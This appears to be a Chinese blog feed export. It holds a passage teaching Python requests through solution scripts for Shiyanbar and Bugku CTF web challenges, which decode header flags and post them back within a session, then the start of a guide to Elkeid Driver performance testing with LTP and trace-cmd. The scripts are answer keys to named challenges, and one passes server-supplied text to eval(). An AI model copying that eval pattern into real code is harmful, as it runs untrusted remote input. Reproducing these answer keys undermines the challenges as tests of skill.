&gt;&gt;&gt; r.headers
&#123;&#39;Status&#39;: &#39;200 OK&#39;, &#39;Expect-CT&#39;: &#39;max-age=2592000, report-uri=...
</code></pre>
<p>查看响应头的某一属性：</p>
<pre><code>&gt;&gt;&gt; r.headers[&#39;Status&#39;]
&#39;200 OK&#39;
</code></pre>
<h2 id="查看响应内容"><a href="#查看响应内容" class="headerlink" title="查看响应内容"></a>查看响应内容</h2><p>对 Github 官网发起请求，查看服务器返回页面的内容，以查看 GET 请求的响应内容为例，POST 请求同理：</p>
<pre><code>&gt;&gt;&gt; r = requests.get(&#39;https://github.com/&#39;)
&gt;&gt;&gt; r.text
u&#39;\n\n\n\n\n\n&lt;!DOCTYPE html&gt;\n&lt;html lang=&quot;en&quot;&gt;\n  &lt;head&gt;\n    &lt;meta charset=&quot;utf-8&quot;&gt;\n...
</code></pre>
<h2 id="传递-GET-请求参数"><a href="#传递-GET-请求参数" class="headerlink" title="传递 GET 请求参数"></a>传递 GET 请求参数</h2><p>GET 请求参数作为查询字符串附加在 URL 末尾，可以通过 <code>requests.get()</code> 方法中的 <code>params</code> 参数完成。例如，我要构建的 URL 为 <code>https://github.com/?username=ciphersaw&amp;id=1</code>，则可以通过以下代码传递 GET 请求参数：</p>
<pre><code>&gt;&gt;&gt; args = &#123;&#39;username&#39;: &#39;ciphersaw&#39;, &#39;id&#39;: 1&#125;
&gt;&gt;&gt; r = requests.get(&#39;https://github.com/&#39;, params = args)
&gt;&gt;&gt; print(r.url)
https://github.com/?username=ciphersaw&amp;id=1
</code></pre>
<p>其中 <code>params</code> 参数是 <code>dict</code> 类型变量。可以看到，带有请求参数的 URL 确实构造好了，不过注意，这里的 <code>username</code> 和 <code>id</code> 是为了说明问题任意构造的，传入 Github 官网后不起作用，下同。</p>
<h2 id="传递-POST-请求参数"><a href="#传递-POST-请求参数" class="headerlink" title="传递 POST 请求参数"></a>传递 POST 请求参数</h2><p>POST 请求参数以表单数据的形式传递，可以通过 <code>requests.post()</code> 方法中的 <code>data</code> 参数完成，具体代码如下：</p>
<pre><code>&gt;&gt;&gt; args = &#123;&#39;username&#39;: &#39;ciphersaw&#39;, &#39;id&#39;: 1&#125;
&gt;&gt;&gt; r = requests.post(&#39;https://github.com/&#39;, data = args)
</code></pre>
<p>其中 <code>data</code> 参数也是 <code>dict</code> 类型变量。由于 POST 请求参数不以明文展现，在此省略验证步骤。</p>
<h2 id="传递-Cookie-参数"><a href="#传递-Cookie-参数" class="headerlink" title="传递 Cookie 参数"></a>传递 Cookie 参数</h2><p>如果想传递自定义 Cookie 到服务器，可以使用 <code>cookies</code> 参数。以 POST 请求为例向 Github 官网提交自定义 Cookie（<code>cookies</code> 参数同样适用于 GET 请求）：</p>
<pre><code>&gt;&gt;&gt; mycookie = &#123;&#39;userid&#39;: &#39;123456&#39;&#125;
&gt;&gt;&gt; r = requests.post(&#39;https://github.com/&#39;, cookies = mycookie)
&gt;&gt;&gt; r.request.headers
...&#39;Cookie&#39;: &#39;userid=123456&#39;,...
</code></pre>
<p>其中 <code>cookies</code> 参数也是 <code>dict</code> 类型变量。可以看到，POST 请求的请求头中确实包含了自定义 Cookie。</p>
<h2 id="会话对象-Session"><a href="#会话对象-Session" class="headerlink" title="会话对象 Session()"></a>会话对象 Session()</h2><p>Session 是存储在服务器上的相关用户信息，用于在有效期内保持客户端与服务器之间的状态。Session 与 Cookie 配合使用，当 Session 或 Cookie 失效时，客户端与服务器之间的状态也随之失效。</p>
<p>有关 Session 的原理可参见以下文章：</p>
<blockquote>
<p><a href="http://blog.csdn.net/yunnysunny/article/details/26935637">session的根本原理及安全性</a><br><a href="http://www.jianshu.com/p/2b7c10291aad">Session原理</a></p>
</blockquote>
<p>requests 模块中的 会话对象 Session() 能够在多次请求中保持某些参数，使得底层的 TCP 连接将被重用，提高了 HTTP 连接的性能。</p>
<p>Session() 的创建过程如下：</p>
<pre><code>&gt;&gt;&gt; s = requests.Session()
</code></pre>
<p>在有效期内，同一个会话对象发出的所有请求都保持着相同的 Cookie，可以看出，会话对象也可以通过 <code>get</code> 与 <code>post</code> 方法发送请求，以发送 GET 请求为例：</p>
<pre><code>&gt;&gt;&gt; r = s.get(&#39;https://github.com/&#39;)
</code></pre>
<h1 id="0x02-writeups"><a href="#0x02-writeups" class="headerlink" title="0x02 writeups"></a>0x02 writeups</h1><p>介绍完 requests 模块的基本使用方法，下面借助几道题来分析讲解。另外，在 HTTP 响应头中获取的 key 值通常是经过 base64 编码的，所以还需要引入內建模块 <a href="https://docs.python.org/3/library/base64.html">base64</a> 用于解码。以下代码均在 Python 3.6 环境下运行。</p>
<h2 id="【实验吧-CTF】-Web-——-天下武功唯快不破"><a href="#【实验吧-CTF】-Web-——-天下武功唯快不破" class="headerlink" title="【实验吧 CTF】 Web —— 天下武功唯快不破"></a>【实验吧 CTF】 Web —— 天下武功唯快不破</h2><p>此题是 Web 类型快速反弹 POST 请求的基础题，结合 requests 模块与 base64 模块写一个 Python 脚本即可实现快速反弹 POST 请求。相关链接如下：</p>
<ul>
<li>题目链接：<a href="http://www.shiyanbar.com/ctf/1854">http://www.shiyanbar.com/ctf/1854</a></li>
<li>解题链接：<a href="http://ctf5.shiyanbar.com/web/10/10.php">http://ctf5.shiyanbar.com/web/10/10.php</a></li>
</ul>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/illustration-of-quick-rebound-of-post-request-in-ctf-web/syb-fast-question.png" alt="syb-fast-question"></p>
<p>进入解题链接，发现如下提示：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/illustration-of-quick-rebound-of-post-request-in-ctf-web/syb-fast-page.png" alt="syb-fast-page"></p>
<p> “没有一种武术是不可击败的，拥有最快的速度才能保持长胜，你必须竭尽所能做到最快。” 换句话说，如果我们没有天下第一的手速，还是借助工具来解题吧。再看看源码有没什么新发现：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/illustration-of-quick-rebound-of-post-request-in-ctf-web/syb-fast-page-source.png" alt="syb-fast-page-source"></p>
<p>提示说请用 POST 请求提交你发现的信息，请求参数的键值是 key。最后按照常规思路看看响应头：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/illustration-of-quick-rebound-of-post-request-in-ctf-web/syb-fast-response-header.png" alt="syb-fast-response-header"></p>
<p>结果发现有一个 FLAG 属性，其值是一段 base64 编码。在用 Python 脚本解题之前，为了打消部分同学的疑虑，先看看纯手工解码再提交 POST 请求会有什么效果：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/illustration-of-quick-rebound-of-post-request-in-ctf-web/syb-fast-submit-key.png" alt="syb-fast-submit-key"></p>
<p>将 FLAG 值进行 base64 解码后，在 Firefox 下用 <a href="https://addons.mozilla.org/zh-CN/firefox/addon/new-hackbar/">New Hackbar</a> 工具提交 POST 请求：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/illustration-of-quick-rebound-of-post-request-in-ctf-web/syb-fast-fail-page.png" alt="syb-fast-fail-page"></p>
<p>提示需要你再快些，显然必须要用编程语言辅助完成了。下面直接上 Python 脚本解题：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://ctf5.shiyanbar.com/web/10/10.php&#x27;</span></span><br><span class="line">headers = requests.get(url).headers</span><br><span class="line">key = base64.b64decode(headers[<span class="string">&#x27;FLAG&#x27;</span>]).decode().split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">post = &#123;<span class="string">&#x27;key&#x27;</span>: key&#125;</span><br><span class="line"><span class="built_in">print</span>(requests.post(url, data = post).text)</span><br></pre></td></tr></table></figure>

<ul>
<li>Line 6：URL 地址的字符串；</li>
<li>Line 7：获得 GET 请求的响应头；</li>
<li>Line 8：先将响应头中 FLAG 属性的值 用base64 解码，得到的结果为 <code>bytes-like objects</code> 类型，再用 <code>decode()</code> 解码得到字符串，最后用 <code>split(&#39;:&#39;)</code> 分离冒号两边的值，返回的 <code>list</code> 对象中的第二个元素即为要提交的 key 值；</li>
<li>Linr 9：构造 POST 请求中 <code>data</code> 参数的 <code>dict</code> 类型变量；</li>
<li>Line 10：提交带有 <code>data</code> 参数的 POST 请求，最终打印响应页面的内容。</li>
</ul>
<p>执行完脚本后，即可看到返回的最终 flag：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/illustration-of-quick-rebound-of-post-request-in-ctf-web/syb-fast-flag.png" alt="syb-fast-flag"></p>
<h2 id="【Bugku-CTF】-Web-——-Web6"><a href="#【Bugku-CTF】-Web-——-Web6" class="headerlink" title="【Bugku CTF】 Web —— Web6"></a>【Bugku CTF】 Web —— Web6</h2><p>此题是上一题的升级版，除了要求快速反弹 POST 请求，还要求所有的请求必须在同一个 Session 内完成，因此会话对象 Session() 就派上用场了。相关链接如下：</p>
<ul>
<li>题目链接：<a href="http://123.206.31.85/challenges#Web6">http://123.206.31.85/challenges#Web6</a></li>
<li>解题链接：<a href="http://120.24.86.145:8002/web6/">http://120.24.86.145:8002/web6/</a></li>
</ul>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/illustration-of-quick-rebound-of-post-request-in-ctf-web/bugku-fast-question.png" alt="bugku-fast-question"></p>
<p>进入解题链接，直接查看源码：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/illustration-of-quick-rebound-of-post-request-in-ctf-web/bugku-fast-page-source.png" alt="bugku-fast-page-source"></p>
<p>发现 POST 请求参数的键值为 margin，最后看看响应头：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/illustration-of-quick-rebound-of-post-request-in-ctf-web/bugku-fast-response-header.png" alt="bugku-fast-response-header"></p>
<p>发现 flag 属性，其值同样是一段 base64 编码。这里就不手工解码再提交 POST 请求了，直接用上一题的 Python 脚本试试：</p>
<blockquote>
<p>此处注意第 8 行的 base64 解码，因为经过第一次 base64 解码后，仍然还是一段 base64 编码，所以要再解码一次。<strong>解题过程中，要自行动手查看每一次解码后的值，才能选择合适的方法去获得最终 key 值。</strong></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://120.24.86.145:8002/web6/&#x27;</span></span><br><span class="line">headers = requests.get(url).headers</span><br><span class="line">key = base64.b64decode(base64.b64decode(headers[<span class="string">&#x27;flag&#x27;</span>]).decode().split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">post = &#123;<span class="string">&#x27;margin&#x27;</span>: key&#125;</span><br><span class="line"><span class="built_in">print</span>(requests.post(url, data = post).text)</span><br></pre></td></tr></table></figure>

<p>结果如下，果然没那么容易得到 flag：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/illustration-of-quick-rebound-of-post-request-in-ctf-web/bugku-fast-fail-without-session.png" alt="bugku-fast-fail-without-session"></p>
<p>嗯，眉头一紧，发现事情并不简单。下面看看 GET 请求与 POST 请求的请求头与响应头是否内有玄机：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://120.24.86.145:8002/web6/&#x27;</span></span><br><span class="line"></span><br><span class="line">get_response = requests.get(url)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;GET Request Headers:\n&#x27;</span>, get_response.request.headers, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;GET Response Headers:\n&#x27;</span>, get_response.headers, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">key = base64.b64decode(base64.b64decode(get_response.headers[<span class="string">&#x27;flag&#x27;</span>]).decode().split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">post = &#123;<span class="string">&#x27;margin&#x27;</span>: key&#125;</span><br><span class="line">post_responese = requests.post(url, data = post)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;POST Request Headers:\n&#x27;</span>, post_responese.request.headers, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;POST Response Headers:\n&#x27;</span>, post_responese.headers, <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>不出所料，结果如下，原来是 GET 请求和 POST 请求的响应头都有 Set-Cookie 属性，并且值不相同，即不在同一个会话中，各自响应头中的 flag 值也不等：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/illustration-of-quick-rebound-of-post-request-in-ctf-web/bugku-fast-fail-headers.png" alt="bugku-fast-fail-headers"></p>
<p>接下来引入会话对象 Session()，稍作修改就能保证 GET 请求与 POST 请求在同一个会话中了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://120.24.86.145:8002/web6/&#x27;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">headers = s.get(url).headers</span><br><span class="line">key = base64.b64decode(base64.b64decode(headers[<span class="string">&#x27;flag&#x27;</span>]).decode().split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">post = &#123;<span class="string">&quot;margin&quot;</span>:key&#125; </span><br><span class="line"><span class="built_in">print</span>(s.post(url, data = post).text)</span><br></pre></td></tr></table></figure>

<p>与上一题代码的区别是：此处用会话对象 Session() 的 <code>get</code> 和 <code>post</code> 方法，而不是直接用 requests 模块里的，这样可以保持 GET 请求与 POST 请求在同一个会话中。将同一会话中的 key 值作为 POST 请求参数提交，最终得到 flag：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/illustration-of-quick-rebound-of-post-request-in-ctf-web/bugku-fast-flag.png" alt="bugku-fast-flag"></p>
<p>虽然到此即可结束，但为了验证以上两次请求真的在同一会话内，我们再次查看请求头与响应头：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://120.24.86.145:8002/web6/&#x27;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">get_response = s.get(url)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;GET Request Headers:\n&#x27;</span>, get_response.request.headers, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;GET Response Headers:\n&#x27;</span>, get_response.headers, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">key = base64.b64decode(base64.b64decode(get_response.headers[<span class="string">&#x27;flag&#x27;</span>]).decode().split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">post = &#123;<span class="string">&#x27;margin&#x27;</span>: key&#125;</span><br><span class="line">post_responese = s.post(url, data = post)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;POST Request Headers:\n&#x27;</span>, post_responese.request.headers, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;POST Response Headers:\n&#x27;</span>, post_responese.headers, <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>结果如下，GET 请求中响应头的 Set-Cookie 属性与 POST 请求中请求头的 Cookie 属性相同，表明两次请求确实在同一会话中。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/illustration-of-quick-rebound-of-post-request-in-ctf-web/bugku-fast-success-headers.png" alt="bugku-fast-success-headers"></p>
<p>既然只需要保持两次请求中 Cookie 属性相同，那能不能构造 Cookie 属性通过普通的 <code>get</code> 与 <code>post</code> 方法完成呢？答案是可以的。请见如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://120.24.86.145:8002/web6/&#x27;</span></span><br><span class="line">headers = requests.get(url).headers</span><br><span class="line">key = base64.b64decode(base64.b64decode(headers[<span class="string">&#x27;flag&#x27;</span>]).decode().split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">post = &#123;<span class="string">&quot;margin&quot;</span>: key&#125; </span><br><span class="line">PHPSESSID = headers[<span class="string">&quot;Set-Cookie&quot;</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>].split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">cookie = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: PHPSESSID&#125;</span><br><span class="line"><span class="built_in">print</span>(requests.post(url, data = post, cookies = cookie).text)</span><br></pre></td></tr></table></figure>

<ul>
<li>Line 10：获得 GET 请求响应头中 Set-Cookie 属性的 PHPSESSID 值，该语句如何构造请自行分析 Set-Cookie 属性字符串值的结构；</li>
<li>Line 11：构造 POST 请求中 <code>cookies</code> 参数的 <code>dict</code> 类型变量；</li>
<li>Line 12：提交带有 <code>data</code> 参数与 <code>cookies</code> 参数的 POST 请求，最终打印响应页面的内容。</li>
</ul>
<p>毫无疑问，以上代码的结果也是最终的 flag。</p>
<h2 id="【Bugku-CTF】-Web-——-秋名山老司机"><a href="#【Bugku-CTF】-Web-——-秋名山老司机" class="headerlink" title="【Bugku CTF】 Web —— 秋名山老司机"></a>【Bugku CTF】 Web —— 秋名山老司机</h2><p>前面两题均是对响应头中与flag相关的属性做解码处理，然后快速反弹一个 POST 请求得到 flag 值。而本题要求计算响应内容中的表达式，将结果用 POST 请求反弹回服务器换取 flag 值。实际上换汤不换药，依旧用 Python 写个脚本即可解决。</p>
<ul>
<li>题目链接：<a href="http://123.206.31.85/challenges#%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA">http://123.206.31.85/challenges#秋名山老司机</a></li>
<li>解题链接：<a href="http://120.24.86.145:8002/qiumingshan/">http://120.24.86.145:8002/qiumingshan/</a></li>
</ul>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/illustration-of-quick-rebound-of-post-request-in-ctf-web/bugku-qiuming-driver.png" alt="bugku-qiuming-driver"></p>
<p>打开解题连接，老规矩先看源码：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/illustration-of-quick-rebound-of-post-request-in-ctf-web/bugku-qiuming-page-source.png" alt="bugku-qiuming-page-source"></p>
<p>题意很明确，要求在 2 秒内计算给出表达式的值…呃，然后呢？刷新页面再看看，噢噢，然后再将计算结果用 POST 请求反弹回服务器，请求参数的 key 值为 <code>value</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/illustration-of-quick-rebound-of-post-request-in-ctf-web/bugku-qiuming-hint.png" alt="bugku-qiuming-hint"></p>
<p>从页面内容中截取表达式，可以用 string 自带的 <code>split()</code> 函数，但必须先要知道表达式两边的字符串，以其作为分隔符；也可以用正则表达式，仅需知道表达式本身的特征即可。此处用正则表达式更佳。先放上题解脚本，再来慢慢解析：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://120.24.86.145:8002/qiumingshan/&#x27;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">source = s.get(url)</span><br><span class="line">expression = re.search(<span class="string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>, source.text).group()</span><br><span class="line"></span><br><span class="line">result = <span class="built_in">eval</span>(expression)</span><br><span class="line">post = &#123;<span class="string">&#x27;value&#x27;</span>: result&#125;</span><br><span class="line"><span class="built_in">print</span>(s.post(url, data = post).text)</span><br></pre></td></tr></table></figure>

<p>有关 requests 的部分此处不细讲，唯一要注意的是，与上一篇 writeup 一样，要利用会话对象 Session()，否则提交结果的时候，重新生成了一个新的表达式，结果自然错误。</p>
<ul>
<li>Line 9：是利用<a href="http://www.runoob.com/python3/python3-reg-expressions.html">正则表达式</a>截取响应内容中的算术表达式。首先引入 re 模块，其次用 <code>search()</code> 匹配算术表达式，匹配成功后用 <code>group()</code> 返回算术表达式的字符串。（想掌握正则表达式，还是要<strong>多看、多想、多练</strong>，毕竟应用场合非常之广）</li>
</ul>
<blockquote>
<p><strong>search() 的第一个参数是匹配的正则表达式，第二个参数是要匹配的字符串。</strong>其中 <code>\d+</code>代表一个或多个数字；<code>[+\-*]</code> 匹配一个加号，或一个减号，或一个乘号，注意减号在中括号内是特殊字符，要用反斜杠转义；<code>(\d+[+\-*])+</code>代表一个或多个由数字与运算符组成的匹配组；最后再加上剩下的一个数字 <code>(\d+)</code>。</p>
</blockquote>
<ul>
<li>Line 11：在获得算术表达式的字符串后，直接利用 Python 的內建方法 <a href="https://docs.python.org/3/library/functions.html#eval"><code>eval()</code></a> 来计算出结果，简单、暴力、快捷。</li>
</ul>
<p>执行完上述脚本，就有一定的概率可以获得 flag 了：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/illustration-of-quick-rebound-of-post-request-in-ctf-web/bugku-qiuming-flag.png" alt="bugku-qiuming-flag"></p>
<p>为什么说是一定概率呢？读者们自行尝试便知，据我观察，当计算结果超出一定长度时，服务器就不响应了。在此猜想：可能客户端 Python 脚本计算错误，也可能服务器端 PHP 脚本对大数计算有误差，还可能在 POST 请求过程中令大整数发生改变。至于是哪种，还请高手解答。</p>
]]></content>
      <categories>
        <category>InfoSec</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Bugku</tag>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>Web</tag>
        <tag>实验吧</tag>
        <tag>Python</tag>
        <tag>HTTP</tag>
        <tag>API</tag>
      </tags>
  </entry>
  <entry>
    <title>Elkeid Driver 性能测试操作指引</title>
    <url>/2023/05/02/operational-guide-of-elkeid-driver-performance-test/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在研究字节跳动 <a href="https://github.com/bytedance/Elkeid">Elkeid</a> HIDS 开源项目的过程中，发现其 <a href="https://github.com/bytedance/Elkeid/blob/main/driver/README.md">Driver</a> 组件通过 <a href="https://docs.kernel.org/trace/kprobes.html">Kprobe</a> 内核探测技术，能够在内核层 hook 系统调用函数，为入侵检测引擎提供了更加丰富可靠的数据源。</p>
<p>然而，在 Driver 组件介绍文档中的<strong>性能测试</strong>部分，只粗略地给出了测试机器配置、压测命令及测试结果，<strong>缺少对测试操作流程的详细描述</strong>，导致社区开发者在修改代码后，难以自行完成性能测试。</p>
<p>因此，笔者将根据测试结果查阅相关资料，倒推出测试操作流程，以作为 Elkeid Driver 组件开发者的参考指引。</p>
<span id="more"></span>

<p>本文操作使用的虚拟机配置如下：</p>
<table>
<thead>
<tr>
<th align="left">配置名称</th>
<th>配置内容</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CPU</td>
<td>Intel(R) Core(TM) i7-6700HQ CPU @ 2.60GHz 1 Core</td>
</tr>
<tr>
<td align="left">内存</td>
<td>2 GB</td>
</tr>
<tr>
<td align="left">系统版本</td>
<td>CentOS Linux release 7.9.2009 (Core)</td>
</tr>
<tr>
<td align="left">内核版本</td>
<td>3.10.0-1160.71.1.el7.x86_64</td>
</tr>
</tbody></table>
<h1 id="0x01-测试工具简介"><a href="#0x01-测试工具简介" class="headerlink" title="0x01 测试工具简介"></a>0x01 测试工具简介</h1><p>根据 Elkeid 项目 Issues 中的 <a href="https://github.com/bytedance/Elkeid/issues/145">Driver 性能测试报告 #145</a>，得知 Driver 组件的性能测试结果是由 <a href="https://linux-test-project.github.io/">LTP</a> 与 <a href="https://www.trace-cmd.org/">trace-cmd</a> 两种工具配合完成的，因此本章将分别介绍两种工具的安装过程与相关用法。</p>
<h2 id="LTP"><a href="#LTP" class="headerlink" title="LTP"></a>LTP</h2><p>LTP（Linux Test Project）是由 SGI 公司发起，并由 IBM、Cisco、Fujitsu、SUSE、Red Hat 等公司开发维护的联合项目，旨在向开源社区提供测试套件，以验证 Linux 内核及其相关功能的可靠性与稳定性。</p>
<p>根据<a href="https://github.com/linux-test-project/ltp">项目说明文档</a>，先从 Github 仓库下载当前最新版本的 LTP 20230127 测试套件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/linux-test-project/ltp.git</span><br><span class="line">$ ll ./ltp/</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/operational-guide-of-elkeid-driver-performance-test/git-clone-ltp.png" alt="git-clone-ltp"></p>
<p>尝试直接配置自动编译工具，若提示相关依赖库缺失，则需参考 INSTALL 文档，通过执行 <code>./ci/centos.sh</code> 脚本补充安装相关依赖库：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ./ltp/</span><br><span class="line">$ ./ci/centos.sh</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/operational-guide-of-elkeid-driver-performance-test/yum-install-centos-ltp-libs.png" alt="yum-install-centos-ltp-libs"></p>
<p>安装依赖库后，继续配置自动编译工具：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ make autotools</span><br><span class="line">$ ./configure</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/operational-guide-of-elkeid-driver-performance-test/make-autotools-and-configure.png" alt="make-autotools-and-configure"></p>
<p>LTP 支持「单测试用例快速编译」与「全测试用例编译安装」。为了便于后续操作，下面将编译安装所有测试用例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ make</span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/operational-guide-of-elkeid-driver-performance-test/make-all-testcases.png" alt="make-all-testcases"></p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/operational-guide-of-elkeid-driver-performance-test/make-install-all-testcases.png" alt="make-install-all-testcases"></p>
<p>由于测试用例较多，需要等待一段时间。安装完毕后，在 &#x2F;opt&#x2F;ltp&#x2F; 目录下可见完整版的 LTP 测试套件，并通过执行 <code>./runltp -h</code> 命令查看相关用法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /opt/ltp/</span><br><span class="line">$ ll</span><br><span class="line">$ ./runltp -h</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/operational-guide-of-elkeid-driver-performance-test/runltp-help.png" alt="runltp-help"></p>
<h2 id="trace-cmd"><a href="#trace-cmd" class="headerlink" title="trace-cmd"></a>trace-cmd</h2><p>trace-cmd 是一个 Linux 系统内核跟踪调试工具，它允许用户对内核函数进行动态跟踪分析，以便发现系统中的活动及其性能问题，</p>
<p>参考<a href="https://github.com/rostedt/trace-cmd">项目说明文档</a>，可通过 yum 源自动下载安装 trace-cmd 工具：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/operational-guide-of-elkeid-driver-performance-test/yum-install-trace-cmd.png" alt="yum-install-trace-cmd"></p>
<p>安装后直接执行 <code>trace-cmd</code> 命令，可查看当前 v2.7 版本对应的相关用法：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/operational-guide-of-elkeid-driver-performance-test/trace-cmd-help.png" alt="trace-cmd-help"></p>
<h1 id="0x02-测试操作流程"><a href="#0x02-测试操作流程" class="headerlink" title="0x02 测试操作流程"></a>0x02 测试操作流程</h1><p>准备工作完成后，测试操作流程正式开始：</p>
<p>首先，下载 Elkeid 项目，并编译装载其 Driver 组件；接下来，执行指定系统调用函数的相关 LTP 测试用例，并同时使用 trace-cmd 工具，对 Driver 组件中编写的内核函数进行跟踪分析；最后，等待 trace-cmd 跟踪任务结束后得到分析结果，即可停止 LTP 测试用例。</p>
